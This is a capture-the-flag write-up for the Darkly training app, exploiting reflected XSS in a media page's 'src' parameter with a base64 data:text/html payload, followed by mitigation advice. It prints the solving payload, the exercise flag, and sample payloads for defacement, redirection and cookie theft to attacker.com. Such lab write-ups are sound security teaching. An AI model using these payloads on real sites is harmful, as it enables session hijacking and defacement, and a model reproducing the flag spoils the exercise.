## Exploiting Reflected XSS on Darkly (Parameter: `src`)

### Objective
Exploit a reflected XSS vulnerability in the `src` parameter of the media page.

Target URL:
```
http://192.168.1.33/?page=media&src=<value>
```

---

### Initial Analysis

The media page utilizes the `src` parameter to include and display external resources via HTML tags such as `<object>`:

```html
<object data="test"></object>
```

After inspecting the application, no validation or filtering of user input for this parameter was detected. This led to the hypothesis that a script could be injected into this parameter to execute a reflected XSS (Cross-Site Scripting) attack.

---

### Exploitation Attempts

#### 1. Initial Injection

A simple script injection was attempted using the `src` parameter:

```
http://192.168.1.33/?page=media&src=<script>alert('XSS')</script>
```

**Result:**
The `<script>` tag was either ignored or filtered, and the attack failed.

---

#### 2. Using `<object>` Tag

Hypothesis: The media page uses tags like `<object>` to display content specified in `src`.

Attempted injection:

```html
<object data="javascript:alert('XSS')"></object>
```

**Result:**
This method also failed as some browsers or configurations block `javascript:` in the `data` attribute.

---

#### 3. Injection via `data:text/html`

The `data:text/html` scheme enables direct injection of HTML or JavaScript encoded within a URL.

- Payload to encode:

```html
<script>alert('XSS')</script>
```

- Base64 Encoded Payload:

```
PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
```

- Constructed URL:

```
http://192.168.1.33/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
```

**Result:**
Success! The XSS executed, and the flag was retrieved:

```
The flag is: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac41
```

---

### Why Does `data:text/html` Work?

- The `data:` scheme allows embedding data directly in an HTML resource.
- The Base64-encoded content is interpreted as HTML by the `<object>` tag.
- In this case, the application applies no filtering or validation, allowing JavaScript execution.

#### Benefits of Base64 Encoding

- Encodes dangerous characters (`<`, `>`, `"`) to bypass filters or firewalls.
- Enables discreet and direct injection of malicious content using the `data:` scheme.

---

### Security Measures to Mitigate XSS

1. **Input Validation:**
   - Reject entries containing unauthorized schemes (e.g., `data:`, `javascript:`).
   - Reject content with potentially dangerous characters (`<`, `>`, `"`, `'`, `;`).
   - Use whitelists to allow only specific values.

2. **Output Encoding:**
   - Encode all user data before inserting it into a web page.

3. **Content Security Policy (CSP):**
   - Implement CSP to block the execution of injected or external scripts.

---

### Impact of XSS

1. **Session Hijacking:**
   Example:
   ```html
   <script>document.write('<img src="http://attacker.com?c='+document.cookie+'">');</script>
   ```

2. **Defacement:**
   Example:
   ```html
   <script>document.body.innerHTML="Hacked by Attacker";</script>
   ```

3. **Redirection:**
   Example:
   ```html
   <script>window.location.href="http://attacker.com";</script>
   ```

